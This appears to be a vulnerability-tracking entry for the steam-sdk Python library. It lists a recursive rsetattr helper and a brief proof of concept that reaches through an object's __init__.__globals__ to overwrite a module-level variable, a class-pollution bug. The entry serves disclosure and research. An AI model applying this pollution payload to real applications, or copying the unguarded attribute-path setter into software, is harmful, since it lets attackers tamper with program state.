## steam-sdk

### Meta

+ Library: steam-sdk
+ Stars: N/A
+ Version: 2025.1.1
+ CVE: N/A
+ Status: Pending
+ Payload: ```rsetattr(obj, "__init__.__globals__.__name__", 'polluted')```
+ Foundby: redacted
+ Report: Pending
+ Type: Lib
+ Exploitability: Low
+ Input: Func

### Library

https://steam-sdk.docs.cern.ch/

### Vulnerable Code Snippet

```python
def rsetattr(obj, attr, val):
    attrs = attr.split('.')
    for attribute in attrs[:-1]:
        if isinstance(obj, dict):
            obj = obj[attribute]
        elif isinstance(obj, list):
            obj = obj[int(attribute)]
        else:
            obj = getattr(obj, attribute)
    if isinstance(obj, dict):
        obj[attrs[-1]] = val
    else:
        setattr(obj, attrs[-1], val)
```
### PoC

```python
import random

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)
rsetattr(obj, "__init__.__globals__.__name__", 'polluted')

print(__name__)
```